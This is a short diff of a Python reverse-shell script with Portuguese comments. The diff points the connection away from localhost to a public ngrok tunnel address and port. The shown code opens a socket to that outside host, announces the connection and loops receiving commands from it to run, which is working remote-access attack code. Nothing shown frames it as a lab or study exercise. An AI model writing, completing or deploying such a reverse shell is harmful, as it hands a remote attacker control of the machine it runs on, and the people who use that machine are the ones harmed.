@@ -6,8 +6,8 @@ import socket
 import subprocess
 
 # variaveis de conexão reversa
-ip = "127.0.0.1"
-port = 8443
+ip = "8.tcp.ngrok.io"
+port = 17534
 
 # iniciando conexao
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -18,7 +18,7 @@ s.send(str.encode("[*] Conexao Estabelecida!\n"))
 # loop de comandos
 while 1:
     try:
-        s.send(str.encode(os.getcwd() + "shell> "))
+        s.send(str.encode("shell> "))
         cmd = s.recv(1024).decode("utf-8")
         cmd = cmd.strip('\n')
         if cmd == "sair": 
